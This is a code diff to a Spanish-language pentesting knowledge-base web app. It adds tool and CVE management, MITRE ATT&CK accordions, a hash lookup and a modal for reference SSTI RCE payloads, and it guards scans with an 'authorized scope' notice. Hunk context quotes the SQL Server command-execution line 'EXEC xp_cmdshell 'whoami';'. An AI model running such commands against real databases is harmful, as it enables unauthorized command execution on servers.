@@ -81,6 +81,9 @@ a{color:var(--blue);text-decoration:none;}a:hover{text-decoration:underline;}
 .ed-title{flex:1;min-width:160px;background:none;border:none;outline:none;color:var(--text);font-size:14px;font-weight:700;font-family:var(--sans);}
 .ed-title::placeholder{color:var(--text4);}
 .sel{background:var(--bg3);border:1px solid var(--border2);color:var(--text2);border-radius:var(--r);padding:4px 8px;font-size:11px;outline:none;font-family:var(--mono);cursor:pointer;}
+/* Los <input> de texto que usan .sel (buscadores MITRE/CVEs…) deben mostrar el
+   cursor de texto, no la manita de .sel (que es para los <select>). */
+input.sel{cursor:text;}
 .sel:focus{border-color:var(--green);}
 .tags-in{background:var(--bg3);border:1px solid var(--border2);color:var(--text);border-radius:var(--r);padding:4px 8px;font-size:11px;outline:none;font-family:var(--mono);width:140px;}
 .tags-in:focus{border-color:var(--cyan);}
@@ -341,6 +344,14 @@ tr.svc-open-row td{background:rgba(0,170,255,.08);}
 .wv-eng-table td{padding:6px 10px;border-bottom:1px solid var(--border);color:var(--text2);}
 .wv-eng-table td:first-child{color:var(--orange);}
 .wv-eng-table tr:hover td{background:var(--bg3);}
+/* Botón «Ver RCE» de la tabla de motores SSTI → abre el modal con el payload */
+.wv-rce-btn{cursor:pointer;background:var(--bg3);border:1px solid var(--border2);color:var(--cyan);border-radius:var(--r);padding:3px 10px;font-family:var(--mono);font-size:10px;white-space:nowrap;transition:border-color .15s,color .15s;}
+.wv-rce-btn:hover{border-color:var(--cyan);color:var(--cyan);background:var(--bg2);}
+/* Acordeón de tácticas del módulo MITRE (secciones plegables) */
+.mitre-acc>summary{list-style:none;cursor:pointer;}
+.mitre-acc>summary::-webkit-details-marker{display:none;}
+.mitre-acc>summary .chev{display:inline-block;transition:transform .15s;font-size:9px;}
+.mitre-acc[open]>summary .chev{transform:rotate(90deg);}
 .wv-files{display:flex;flex-wrap:wrap;gap:6px;}
 .wv-file-chip{font-family:var(--mono);font-size:11px;color:var(--orange);background:var(--bg);border:1px solid var(--border);border-radius:var(--r);padding:3px 8px;cursor:pointer;}
 .wv-file-chip:hover{border-color:var(--orange);}
@@ -599,6 +610,7 @@ La IA clasificará el contenido, extraerá comandos, herramientas y CVEs automá
         <option value="malware">Malware</option>
       </select>
       <span style="font-size:10px;color:var(--text3);font-family:var(--mono);" id="toolCount"></span>
+      <button class="btn-outline" onclick="openAddTool()" style="flex-shrink:0;" title="Añadir una herramienta a mano">+ Añadir</button>
     </div>
     <div class="tools-grid" id="toolsGrid">
       <div class="no-tools"><p>⚙ Sin herramientas aún</p><p style="font-size:11px">Sube un documento o escribe sobre una herramienta — se detectarán automáticamente.</p></div>
@@ -780,15 +792,17 @@ La IA clasificará el contenido, extraerá comandos, herramientas y CVEs automá
   <div class="panel" id="panel-enum">
     <div style="display:flex;align-items:center;gap:8px;padding:5px 10px;background:var(--bg2);border-bottom:1px solid var(--border);flex-shrink:0;">
       <span style="font-size:10px;font-family:var(--mono);color:var(--text3);white-space:nowrap;">🎯 OBJETIVO</span>
-      <input type="text" id="enumTarget" placeholder="IP o dominio (ej. 10.10.10.5) — rellena todos los comandos" oninput="applyEnumTarget()"
-        style="max-width:340px;background:var(--bg3);border:1px solid var(--border2);color:var(--text);border-radius:var(--r);padding:3px 9px;font-size:11px;font-family:var(--mono);outline:none;"
+      <!-- Ancho ~250px: lo justo para que el placeholder de ejemplo se vea entero
+           sin ocupar de más (min 200 para no cortarlo en pantallas estrechas). -->
+      <input type="text" id="enumTarget" placeholder="IP o dominio — ej. 10.10.10.5" title="Rellena automáticamente todos los comandos de abajo" oninput="applyEnumTarget()"
+        style="flex:0 1 250px;min-width:200px;max-width:250px;background:var(--bg3);border:1px solid var(--border2);color:var(--text);border-radius:var(--r);padding:3px 9px;font-size:11px;font-family:var(--mono);outline:none;"
         onfocus="this.style.borderColor='var(--cyan)'" onblur="this.style.borderColor='var(--border2)'">
       <span style="margin-left:auto;font-size:10px;color:var(--text3);font-family:var(--mono);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;" title="Escanea y enumera únicamente los sistemas incluidos en el alcance autorizado de la auditoría.">🛡 Solo dentro del alcance autorizado</span>
     </div>
     <div class="enum-subtabs">
-      <button class="enum-stab active" id="estab-discovery" onclick="switchEnumTab('discovery')">① 🌐 Descubrir la red</button>
-      <button class="enum-stab" id="estab-scan" onclick="switchEnumTab('scan')">② ⚡ Escanear puertos</button>
-      <button class="enum-stab" id="estab-services" onclick="switchEnumTab('services')">③ 🔍 Enumerar servicios</button>
+      <button class="enum-stab active" id="estab-discovery" onclick="switchEnumTab('discovery')">🌐 Descubrir la red</button>
+      <button class="enum-stab" id="estab-scan" onclick="switchEnumTab('scan')">⚡ Escanear puertos</button>
+      <button class="enum-stab" id="estab-services" onclick="switchEnumTab('services')">🔍 Enumerar servicios</button>
     </div>
 
     <!-- SECTION 1: Descubrimiento de Red -->
@@ -1043,8 +1057,7 @@ La IA clasificará el contenido, extraerá comandos, herramientas y CVEs automá
     <div class="enum-section" id="esec-services">
       <div class="enum-group" style="display:flex;align-items:center;gap:10px;flex-wrap:wrap;">
         <span style="font-size:9px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;color:var(--text3);font-family:var(--mono);">Puertos abiertos</span>
-        <input type="text" id="svcOpenPorts" placeholder="22,80,445…" oninput="onSvcPortsChanged()" style="background:var(--bg3);border:1px solid var(--border2);color:var(--text);border-radius:var(--r);padding:3px 9px;font-size:11px;font-family:var(--mono);outline:none;max-width:180px;" title="Los puertos que te dio la Fase 1 del escaneo. Se sincroniza con ②.">
-        <label style="display:flex;align-items:center;gap:5px;font-size:10px;font-family:var(--mono);color:var(--text2);cursor:pointer;"><input type="checkbox" id="svcOnlyOpen" onchange="highlightServices()"> Solo abiertos</label>
+        <input type="text" id="svcOpenPorts" placeholder="22,80,445…" oninput="onSvcPortsChanged()" style="background:var(--bg3);border:1px solid var(--border2);color:var(--text);border-radius:var(--r);padding:3px 9px;font-size:11px;font-family:var(--mono);outline:none;max-width:180px;" title="Los puertos que te dio la Fase 1 del escaneo. Se sincroniza con la pestaña Escanear puertos.">
         <span id="svcOpenHint" style="font-size:10px;color:var(--text3);font-family:var(--mono);"></span>
       </div>
 
@@ -1397,7 +1410,8 @@ EXEC xp_cmdshell 'whoami';</pre>
   <div class="panel" id="panel-mitre">
     <div class="ed-toolbar" style="gap:8px;">
       <span style="font-size:10px;font-family:var(--mono);color:var(--text3);">⚡ MITRE ATT&amp;CK</span>
-      <input type="text" id="mitreSearch" class="sel" placeholder="Buscar técnica, ID o táctica..." style="flex:1;max-width:340px;" oninput="searchMitre(this.value)">
+      <input type="text" id="mitreSearch" class="sel" placeholder="Buscar por ID (T1055) o nombre para añadir…" style="flex:1;max-width:340px;" oninput="searchMitre(this.value)">
+      <button class="btn-outline" onclick="clearMitreSearch()" title="Limpiar búsqueda" style="flex-shrink:0;padding:4px 11px;">✕</button>
       <span id="mitreTotalBadge" style="font-size:10px;font-family:var(--mono);color:var(--text3);"></span>
       <div style="flex:1"></div>
       <button class="btn-outline" onclick="loadMitre()">↺ Recargar</button>
@@ -1411,12 +1425,16 @@ EXEC xp_cmdshell 'whoami';</pre>
   <div class="panel" id="panel-forensic">
     <div class="ed-toolbar" style="gap:8px;flex-wrap:wrap;">
       <span style="font-size:10px;font-family:var(--mono);color:var(--text3);flex-shrink:0;">🔬 MODO FORENSE</span>
-      <input type="text" id="forensicHash" class="sel" placeholder="SHA256 (64 hex)..." style="flex:1;min-width:240px;font-family:var(--mono);"
-        oninput="document.getElementById('forensicHash').style.borderColor=this.value.length===64?'var(--green)':this.value.length>0?'var(--orange)':''"
+      <input type="text" id="forensicHash" class="sel" placeholder="Hash MD5 / SHA1 / SHA256…" style="flex:1;min-width:240px;font-family:var(--mono);"
+        oninput="this.style.borderColor=/^[0-9a-f]{32}$|^[0-9a-f]{40}$|^[0-9a-f]{64}$/i.test(this.value.trim())?'var(--green)':this.value.length>0?'var(--orange)':''"
         onkeydown="if(event.key==='Enter')runForensic()">
+      <input type="file" id="forensicFile" style="display:none;" onchange="hashFile(this.files[0]);this.value='';">
+      <button class="btn-outline" onclick="document.getElementById('forensicFile').click()" title="Calcula el SHA256 del fichero en tu navegador — el fichero NO se sube">📁 Fichero</button>
       <button class="btn-ai" id="btnForensic" onclick="runForensic()">▶ Analizar</button>
       <button class="btn-outline" onclick="clearForensic()">✕ Limpiar</button>
     </div>
+    <!-- Aviso si faltan API keys (1C) -->
+    <div id="forensicKeysBanner" style="display:none;padding:8px 14px;background:rgba(255,102,0,.08);border-bottom:1px solid rgba(255,102,0,.3);font-size:11px;color:var(--orange);"></div>
     <!-- Pipeline steps -->
     <div id="forensicPipeline" style="display:none;padding:10px 14px;border-bottom:1px solid var(--border);background:var(--bg2);">
       <div style="display:flex;gap:16px;align-items:center;flex-wrap:wrap;">
@@ -1429,7 +1447,7 @@ EXEC xp_cmdshell 'whoami';</pre>
           <span class="fstep-icon" id="ficon-mb">⟳</span>
           <span style="font-size:11px;font-family:var(--mono);">MalwareBazaar</span>
         </div>
-        <div style="color:var(--text3);font-size:14px;">→</div>
+        <div id="farrow-ar" style="color:var(--text3);font-size:14px;">→</div>
         <div class="forensic-step" id="fstep-ar">
           <span class="fstep-icon" id="ficon-ar">·</span>
           <span style="font-size:11px;font-family:var(--mono);color:var(--text3);">Any.run</span>
@@ -1522,6 +1540,19 @@ EXEC xp_cmdshell 'whoami';</pre>
   </div>
 </div>
 
+<!-- SSTI RCE MODAL -->
+<div class="overlay" id="rceModal">
+  <div class="modal" style="max-width:640px;width:96vw;">
+    <h3 id="rceTitle">Payload RCE</h3>
+    <p style="margin:0;">Payload de ejecución de comandos de referencia. Su funcionamiento depende de la versión y configuración del motor.</p>
+    <pre id="rceCode" style="background:var(--bg3);border:1px solid var(--border2);border-radius:var(--r);padding:12px;font-family:var(--mono);font-size:12px;color:var(--orange);white-space:pre-wrap;word-break:break-all;overflow-x:auto;margin:0;"></pre>
+    <div class="modal-actions">
+      <button class="btn-outline" id="rceCopyBtn" onclick="copyRce(this)">⎘ Copiar</button>
+      <button class="btn-outline" onclick="closeModal('rceModal')">Cerrar</button>
+    </div>
+  </div>
+</div>
+
 <!-- TOOL DETAIL MODAL -->
 <div class="overlay" id="toolModal">
   <div class="modal">
@@ -1529,6 +1560,47 @@ EXEC xp_cmdshell 'whoami';</pre>
     <div id="tmBody"></div>
     <div class="modal-actions">
       <button class="btn-outline" onclick="closeModal('toolModal')">Cerrar</button>
+    </div>
+  </div>
+</div>
+
+<!-- ADD TOOL MODAL -->
+<div class="overlay" id="addToolModal">
+  <div class="modal" style="max-width:520px;width:95vw;">
+    <h3>⚙ Añadir herramienta</h3>
+    <label>Nombre *</label>
+    <input id="atName" type="text" placeholder="p. ej. nmap">
+    <label>URL</label>
+    <input id="atUrl" type="text" placeholder="https://...">
+    <div style="display:flex;gap:8px;">
+      <div style="flex:1;">
+        <label>Categoría</label>
+        <select id="atCat" class="sel" style="width:100%;">
+          <option value="">— sin categoría —</option>
+          <option value="reconocimiento">Reconocimiento</option>
+          <option value="enumeracion">Enumeración</option>
+          <option value="explotacion">Explotación</option>
+          <option value="post-explotacion">Post-Explotación</option>
+          <option value="web-hacking">Web Hacking</option>
+          <option value="osint">OSINT</option>
+          <option value="forense">Forense</option>
+          <option value="malware">Malware</option>
+        </select>
+      </div>
+      <div style="flex:1;">
+        <label>Tipo</label>
+        <select id="atType" class="sel" style="width:100%;">
+          <option value="software">⚙ Software</option>
+          <option value="web">🌐 Recurso web</option>
+        </select>
+      </div>
+    </div>
+    <label>Descripción</label>
+    <textarea id="atDesc" placeholder="Qué hace la herramienta..."></textarea>
+    <label style="display:flex;align-items:center;gap:8px;cursor:pointer;color:var(--text2);font-size:12px;letter-spacing:0;text-transform:none;margin-top:4px;"><input type="checkbox" id="atApi" style="width:auto;flex-shrink:0;margin:0;"> Requiere API key</label>
+    <div class="modal-actions">
+      <button class="btn-outline" onclick="closeModal('addToolModal')">Cancelar</button>
+      <button class="btn-green" onclick="submitAddTool()">Crear</button>
     </div>
   </div>
 </div>
@@ -1862,7 +1934,9 @@ const API = {
   },
   async del(path){
     const r=await fetch(this.base+path,{method:'DELETE'});
-    if(!r.ok) throw new Error(await r.text());
+    // Adjuntamos el status HTTP al Error para que quien llame pueda distinguir
+    // casos (p. ej. deleteCVE trata el 404 como "ya no estaba", no como error).
+    if(!r.ok){ const err=new Error(await r.text()); err.status=r.status; throw err; }
     return r.status===204?null:r.json();
   },
 };
@@ -2194,6 +2268,7 @@ function renderToolsGrid(){
     const catStyle=t.category?`background:${catColor(t.category)}22;color:${catColor(t.category)};border-color:${catColor(t.category)}66`:'background:var(--bg4);color:var(--text3);border-color:var(--border)';
       const isWeb=(t.tool_type||'software')==='web';
     return `<div class="tool-card" onclick="openToolModal(${t.id})">
+      ${(t.tags||[]).includes('catalogo-base')?`<span class="tool-badge" style="position:absolute;top:10px;right:10px;color:var(--purple);border-color:var(--purple);background:rgba(170,85,255,.12)" title="Herramienta del catálogo base de pentest">★ Base</span>`:''}
       <div class="tool-card-hd">
         <div class="tool-icon">${icon}</div>
         <div style="flex:1;min-width:0">
@@ -2262,14 +2337,22 @@ async function openToolModal(id){
       html+='</div>';
     }
 
-    // URL edit form
+    // Formulario de edición (URL, categoría, tipo, API, descripción) + borrar
+    const _catOpts=['reconocimiento','enumeracion','explotacion','post-explotacion','web-hacking','osint','forense','malware']
+      .map(c=>`<option value="${c}" ${t.category===c?'selected':''}>${catLabel(c)}</option>`).join('');
     html+=`<div style="margin-top:12px;padding-top:12px;border-top:1px solid var(--border)">
-      <div class="ai-section-title" style="margin-bottom:6px">Editar URL / Descripción</div>
+      <div class="ai-section-title" style="margin-bottom:6px">Editar</div>
+      <input id="toolEditUrl" type="text" value="${esc(t.url||'')}" placeholder="URL https://..." style="width:100%;background:var(--bg3);border:1px solid var(--border2);color:var(--text);border-radius:var(--r);padding:5px 8px;font-size:11px;outline:none;font-family:var(--mono);margin-bottom:6px">
       <div style="display:flex;gap:8px;margin-bottom:6px">
-        <input id="toolEditUrl" type="text" value="${esc(t.url||'')}" placeholder="https://..." style="flex:1;background:var(--bg3);border:1px solid var(--border2);color:var(--text);border-radius:var(--r);padding:5px 8px;font-size:11px;outline:none;font-family:var(--mono)">
-        <button class="btn-green" onclick="updateTool(${t.id})">Guardar</button>
+        <select id="toolEditCat" class="sel" style="flex:1"><option value="">— sin categoría —</option>${_catOpts}</select>
+        <select id="toolEditType" class="sel" style="flex:1"><option value="software" ${t.tool_type!=='web'?'selected':''}>⚙ Software</option><option value="web" ${t.tool_type==='web'?'selected':''}>🌐 Web</option></select>
       </div>
+      <label style="display:flex;align-items:center;gap:8px;font-size:11px;color:var(--text2);margin-bottom:6px;cursor:pointer;letter-spacing:0;text-transform:none;"><input type="checkbox" id="toolEditApi" ${t.requires_api?'checked':''} style="width:auto;flex-shrink:0;margin:0;"> Requiere API key</label>
       <textarea id="toolEditDesc" placeholder="Descripción..." style="width:100%;background:var(--bg3);border:1px solid var(--border2);color:var(--text);border-radius:var(--r);padding:5px 8px;font-size:11px;outline:none;font-family:var(--mono);min-height:60px;resize:vertical">${esc(t.description||'')}</textarea>
+      <div style="display:flex;gap:8px;margin-top:8px;justify-content:space-between">
+        <button class="btn-danger" onclick='deleteTool(${t.id},${jarg(t.name)})'>🗑 Borrar</button>
+        <button class="btn-green" onclick="updateTool(${t.id})">Guardar cambios</button>
+      </div>
     </div>`;
 
     document.getElementById('tmBody').innerHTML=html;
@@ -2282,11 +2365,51 @@ async function updateTool(id){
   const url=document.getElementById('toolEditUrl').value.trim();
   const desc=document.getElementById('toolEditDesc').value.trim();
   try{
-    await API.put('/api/tools/'+id,{url,description:desc});
+    await API.put('/api/tools/'+id,{
+      url, description:desc,
+      category:document.getElementById('toolEditCat').value,   // "" limpia la categoría
+      tool_type:document.getElementById('toolEditType').value,
+      requires_api:document.getElementById('toolEditApi').checked,
+    });
     await loadAll();
     closeModal('toolModal');
     setStatus('Herramienta actualizada');
   }catch(e){setStatus('Error: '+e.message,'error');}
+}
+
+// ─── Añadir / borrar / sembrar herramientas (módulo Herramientas) ─────────────
+function openAddTool(){
+  ['atName','atUrl','atDesc'].forEach(id=>document.getElementById(id).value='');
+  document.getElementById('atCat').value='';
+  document.getElementById('atType').value='software';
+  document.getElementById('atApi').checked=false;
+  document.getElementById('addToolModal').classList.add('show');
+}
+async function submitAddTool(){
+  const name=document.getElementById('atName').value.trim();
+  if(!name){ setStatus('El nombre es obligatorio','warn'); return; }
+  try{
+    const r=await API.post('/api/tools',{
+      name,
+      url:document.getElementById('atUrl').value.trim()||null,
+      description:document.getElementById('atDesc').value.trim()||null,
+      category:document.getElementById('atCat').value||null,
+      tool_type:document.getElementById('atType').value,
+      requires_api:document.getElementById('atApi').checked,
+    });
+    closeModal('addToolModal');
+    await loadAll();
+    setStatus(r.created?('Herramienta "'+name+'" añadida'):('"'+name+'" ya existía — mención +1'));
+  }catch(e){ setStatus('Error añadiendo: '+e.message,'error'); }
+}
+async function deleteTool(id,name){
+  if(!confirm('¿Borrar la herramienta "'+name+'"?')) return;
+  try{
+    await API.del('/api/tools/'+id);
+    closeModal('toolModal');
+    await loadAll();
+    setStatus('Herramienta "'+name+'" borrada');
+  }catch(e){ setStatus('Error borrando: '+e.message,'error'); }
 }
 
 // ─── COMMANDS ─────────────────────────────────────────────────────────────────
@@ -3153,6 +3276,28 @@ async function lookupCVE(id){
     list.innerHTML='<div class="empty-msg" style="color:var(--red)">Error consultando NVD: '+esc(e.message)+'</div>';
   }
 }
+// Borra un CVE de la KB (botón "🗑 Borrar" de la tarjeta). Simetría con
+// Herramientas; el backend expone DELETE /api/cves/{id} por id numérico.
+async function deleteCVE(id, cveId, btn){
+  if(!confirm('¿Borrar el CVE '+cveId+' de la KB?')) return;
+  try{
+    await API.del('/api/cves/'+id);
+    await loadAll();
+    renderCVEs();
+    setStatus('CVE '+cveId+' borrado de la KB');
+  }catch(e){
+    if(e.status===404){
+      // El CVE ya no estaba (otra pestaña lo borró, o la lista está obsoleta).
+      // No es un error para el usuario: refrescamos y seguimos.
+      await loadAll();
+      renderCVEs();
+      setStatus('El CVE '+cveId+' ya no estaba en la KB; lista actualizada','warn');
+    } else {
+      setStatus('Error borrando CVE: '+e.message,'error');
+    }
+  }
+}
+
 // Rellena un CVE existente con los datos oficiales de NVD (botón "↻ Enriquecer").
 // El trabajo lo hace el backend; aquí solo lanzamos la petición y refrescamos.
 async function enrichCVE(cveId, btn){
@@ -3215,6 +3360,7 @@ function renderCVEs(){
         <a href="https://nvd.nist.gov/vuln/detail/${esc(c.cve_id)}" target="_blank" class="nvd-link">↗ NVD</a>
         <a href="https://www.exploit-db.com/search?cve=${esc(c.cve_id)}" target="_blank" class="nvd-link" style="color:var(--orange);border-color:rgba(255,102,0,.3);">↗ EDB</a>
         <button class="nvd-link" style="cursor:pointer;background:none;border:none;padding:0;color:var(--cyan);" onclick="enrichCVE('${esc(c.cve_id)}',this)" title="Rellenar CVSS, severidad y descripción oficiales desde NVD">↻ Enriquecer</button>
+        <button class="nvd-link" style="cursor:pointer;background:none;border:none;padding:0;color:var(--red);" onclick="deleteCVE(${c.id},'${esc(c.cve_id)}',this)" title="Borrar este CVE de la KB">🗑 Borrar</button>
         <div style="margin-top:6px;">${edbBadge}</div>
       </div>
       <div class="cve-body">
@@ -3334,6 +3480,8 @@ function switchTab(name){
   if(name==='mitre') loadMitre();
   if(name==='enum'){ initEnumSaveButtons(); initEnumTarget(); highlightServices(); }
   if(name==='webvuln') renderWebVulnList();
+  if(name==='cves') renderCVEs();   // repinta por si se guardó un CVE desde otra pestaña (p. ej. Enum)
+  if(name==='forensic') initForensic();
 }
 
 // ─── MODALS ───────────────────────────────────────────────────────────────────
@@ -3495,99 +3643,206 @@ function setToolTypeFilter(val,btn){
 }
 
 // ─── MITRE ATT&CK ─────────────────────────────────────────────────────────────
+// Orden canónico de las 14+1 tácticas ATT&CK Enterprise (v19.2: "Defense Evasion"
+// pasó a "Stealth" y se añadió "Defense Impairment"). Debe coincidir con las
+// tácticas del catálogo mitre_reference.json.
 const TACTIC_ORDER=['Reconnaissance','Resource Development','Initial Access','Execution','Persistence',
-  'Privilege Escalation','Defense Evasion','Credential Access','Discovery','Lateral Movement',
-  'Collection','Command and Control','Exfiltration','Impact'];
+  'Privilege Escalation','Stealth','Defense Impairment','Credential Access','Discovery',
+  'Lateral Movement','Collection','Command and Control','Exfiltration','Impact'];
 
 function mitreTacticColor(tactic){
   const idx=TACTIC_ORDER.indexOf(tactic);
   const colors=['#94a3b8','#64748b','#ef4444','#f97316','#eab308','#a855f7','#6366f1',
-    '#ec4899','#06b6d4','#3b82f6','#10b981','#f59e0b','#14b8a6','#f43f5e'];
+    '#8b5cf6','#ec4899','#06b6d4','#3b82f6','#10b981','#f59e0b','#14b8a6','#f43f5e'];
   return idx>=0?colors[idx]:'#f59e0b';
 }
 
+// IDs de técnica ya guardadas en el módulo (para marcar cuáles ya tienes en el
+// buscador de referencia). Se refresca en cada loadMitre().
+let _mitreSaved=new Set();
+
+// Icono de papelera (SVG monocromo que hereda el color con currentColor; el emoji
+// 🗑 no se puede teñir). Se usa en las tarjetas y en los resultados del buscador.
+const TRASH_SVG='<svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 6h18M8 6V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2m2 0v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6M10 11v6M14 11v6"/></svg>';
+
 async function loadMitre(){
   const body=document.getElementById('mitreBody');
+  const search=document.getElementById('mitreSearch');
+  if(search) search.value='';
   try{
     const data=await API.get('/api/mitre');
     document.getElementById('mitreTotalBadge').textContent=data.total+' técnicas';
-    renderMitreTactics(data.tactics);
+    _mitreSaved=new Set();
+    Object.values(data.tactics).forEach(arr=>arr.forEach(t=>_mitreSaved.add(t.technique_id)));
+    body.innerHTML=renderMitreTactics(data.tactics);
   }catch(e){
     body.innerHTML=`<div class="empty-msg">Error cargando técnicas: ${esc(String(e))}</div>`;
   }
 }
 
+// Devuelve el HTML de las tácticas con sus técnicas, cada táctica como sección
+// plegable (<details>, abierta por defecto). 2A: agrega por technique_id (una
+// tarjeta por técnica aunque aparezca en varias notas → badge "en N notas").
 function renderMitreTactics(tactics){
-  const body=document.getElementById('mitreBody');
   if(!tactics||Object.keys(tactics).length===0){
-    body.innerHTML='<div class="empty-msg">No hay técnicas MITRE extraídas aún. Sube documentos con técnicas ATT&CK.</div>';
-    return;
+    return '<div class="empty-msg">Aún no tienes técnicas. Busca arriba por ID o nombre para añadirlas desde ATT&CK, o sube documentos con técnicas.</div>';
   }
-  // Sort tactics by canonical order, unknowns last
   const sorted=Object.keys(tactics).sort((a,b)=>{
     const ia=TACTIC_ORDER.indexOf(a),ib=TACTIC_ORDER.indexOf(b);
     if(ia<0&&ib<0) return a.localeCompare(b);
     if(ia<0) return 1; if(ib<0) return -1;
     return ia-ib;
   });
-
   let html='';
   for(const tactic of sorted){
-    const techs=tactics[tactic];
     const col=mitreTacticColor(tactic);
-    html+=`<div style="margin-bottom:18px;">
-      <div style="font-size:11px;font-family:var(--mono);color:${col};text-transform:uppercase;letter-spacing:1px;
-        border-bottom:1px solid ${col}33;padding-bottom:4px;margin-bottom:8px;">
-        ⚡ ${esc(tactic)} <span style="color:var(--text3);font-size:10px;">(${techs.length})</span>
-      </div>
-      <div style="display:flex;flex-wrap:wrap;gap:6px;">`;
-    for(const t of techs){
-      const tid=t.technique_id;
+    // 2A — agrupar filas por technique_id
+    const byId={};
+    for(const t of tactics[tactic]){ (byId[t.technique_id]=byId[t.technique_id]||[]).push(t); }
+    const ids=Object.keys(byId);
+    let cards='';
+    for(const tid of ids){
+      const group=byId[tid], t=group[0];
       const turl='https://attack.mitre.org/techniques/'+tid.replace('.','/');
-      html+=`<div style="background:var(--bg3);border:1px solid ${col}44;border-radius:6px;padding:7px 10px;
-          min-width:180px;max-width:260px;flex:1;cursor:pointer;"
-          title="${esc(t.context_snippet||'')}"
-          onclick="mitreCardClick(${t.note_id},event)">
+      const notes=[...new Set(group.filter(g=>g.note_id).map(g=>g.note_id))];
+      const srcBadge = notes.length
+        ? `<span onclick="mitreCardClick(${notes[0]})" title="Ver nota" style="font-size:9px;color:var(--text3);cursor:pointer;text-decoration:underline dotted;">en ${notes.length} nota${notes.length>1?'s':''}</span>`
+        : `<span style="font-size:9px;color:var(--text3)">manual</span>`;
+      cards+=`<div style="background:var(--bg3);border:1px solid ${col}44;border-radius:6px;padding:7px 10px;min-width:200px;max-width:290px;flex:1;">
         <div style="display:flex;align-items:center;gap:6px;margin-bottom:3px;">
-          <a href="${turl}" target="_blank" onclick="event.stopPropagation()"
-            style="font-size:11px;font-family:var(--mono);color:${col};text-decoration:none;
-              background:${col}22;padding:1px 6px;border-radius:4px;">${esc(tid)}</a>
-          ${t.note_id?`<span style="font-size:9px;color:var(--text3)">nota #${t.note_id}</span>`:''}
+          <a href="${turl}" target="_blank" style="font-size:11px;font-family:var(--mono);color:${col};text-decoration:none;background:${col}22;padding:1px 6px;border-radius:4px;">${esc(tid)}</a>
+          <div style="flex:1"></div>
+          <button onclick="deleteMitreTech('${esc(tid)}',event)" title="Quitar del módulo" style="background:none;border:none;color:var(--red);cursor:pointer;padding:0;line-height:0;display:inline-flex;align-items:center;">${TRASH_SVG}</button>
         </div>
         <div style="font-size:11px;color:var(--text1);font-weight:500;">${esc(t.technique_name||'')}</div>
-        ${t.context_snippet?`<div style="font-size:10px;color:var(--text3);margin-top:3px;overflow:hidden;
-          text-overflow:ellipsis;white-space:nowrap;">${esc(t.context_snippet.substring(0,80))}</div>`:''}
+        ${t.context_snippet?`<div style="font-size:10px;color:var(--text3);margin-top:4px;line-height:1.4;display:-webkit-box;-webkit-line-clamp:3;-webkit-box-orient:vertical;overflow:hidden;" title="${esc(t.context_snippet)}">${esc(t.context_snippet)}</div>`:''}
+        <div style="margin-top:5px;display:flex;align-items:center;gap:8px;">${srcBadge}
+          <a href="${turl}" target="_blank" style="font-size:9px;color:var(--cyan);text-decoration:none;">ℹ️ más info</a></div>
       </div>`;
     }
-    html+=`</div></div>`;
+    html+=`<details class="mitre-acc" open style="margin-bottom:12px;">
+      <summary style="font-size:11px;font-family:var(--mono);color:${col};text-transform:uppercase;letter-spacing:1px;
+        border-bottom:1px solid ${col}33;padding-bottom:4px;display:flex;align-items:center;gap:6px;">
+        <span class="chev">▸</span>⚡ ${esc(tactic)} <span style="color:var(--text3);font-size:10px;">(${ids.length})</span></summary>
+      <div style="display:flex;flex-wrap:wrap;gap:6px;margin-top:8px;">${cards}</div>
+    </details>`;
   }
-  body.innerHTML=html;
+  return html;
 }
 
 function mitreCardClick(noteId,ev){
+  if(ev) ev.stopPropagation();
   if(!noteId) return;
   loadNote(noteId);
   switchTab('editor');
 }
 
+// 2B — Quita una técnica entera del módulo (todas sus filas).
+async function deleteMitreTech(tid, ev){
+  if(ev) ev.stopPropagation();
+  if(!confirm('¿Quitar la técnica '+tid+' de tu módulo?')) return;
+  try{
+    await API.del('/api/mitre/technique/'+encodeURIComponent(tid));
+    loadMitre();
+    setStatus('Técnica '+tid+' quitada del módulo');
+  }catch(e){
+    if(e.status===404){ loadMitre(); setStatus('La técnica '+tid+' ya no estaba; lista actualizada','warn'); }
+    else setStatus('Error quitando '+tid+': '+e.message,'error');
+  }
+}
+
+// 1A — Añade una técnica desde el buscador de referencia (POST /api/mitre).
+// HTML de la zona de acción de un resultado del buscador: "➕ Añadir" si no la
+// tienes, o "✓ en tu módulo" + papelera para quitarla en el momento si ya la tienes.
+function mitreRefAction(tid){
+  if(_mitreSaved.has(tid)){
+    return `<span style="font-size:10px;font-weight:600;color:var(--green);font-family:var(--mono);background:rgba(0,255,136,.12);border:1px solid var(--green);border-radius:10px;padding:2px 9px;white-space:nowrap;">✓ En tu módulo</span>`+
+      `<button onclick='removeMitreFromRef(${jarg(tid)},this)' title="Quitar del módulo" style="background:none;border:none;color:var(--red);cursor:pointer;padding:0;line-height:0;display:inline-flex;align-items:center;">${TRASH_SVG}</button>`;
+  }
+  return `<button class="enum-save-btn" onclick='addMitreTech(${jarg(tid)},this)'>➕ Añadir</button>`;
+}
+
+// 1A — Añade desde el buscador y deja la fila lista para quitarla al momento
+// (cambia la zona de acción a "✓ en tu módulo" + papelera), sin recargar la búsqueda.
+async function addMitreTech(tid, btn){
+  const cont=btn.closest('.mitre-ref-action');
+  btn.disabled=true; btn.textContent='⟳…';
+  try{
+    const r=await API.post('/api/mitre',{technique_id:tid});
+    _mitreSaved.add(tid);
+    if(cont) cont.innerHTML=mitreRefAction(tid);
+    setStatus(r.created?('Técnica '+tid+' añadida al módulo'):('Técnica '+tid+' ya estaba'));
+  }catch(e){ btn.disabled=false; btn.textContent='➕ Añadir'; setStatus('No se pudo añadir '+tid+': '+e.message,'error'); }
+}
+
+// Quita una técnica desde el buscador (papelera del resultado) y devuelve la zona
+// de acción a "➕ Añadir". Sin confirmación: es reversible al instante (re-añadir).
+async function removeMitreFromRef(tid, btn){
+  const cont=btn.closest('.mitre-ref-action');
+  try{
+    await API.del('/api/mitre/technique/'+encodeURIComponent(tid));
+    _mitreSaved.delete(tid);
+    if(cont) cont.innerHTML=mitreRefAction(tid);
+    setStatus('Técnica '+tid+' quitada del módulo');
+  }catch(e){
+    if(e.status===404){ _mitreSaved.delete(tid); if(cont) cont.innerHTML=mitreRefAction(tid); }
+    else setStatus('Error quitando '+tid+': '+e.message,'error');
+  }
+}
+
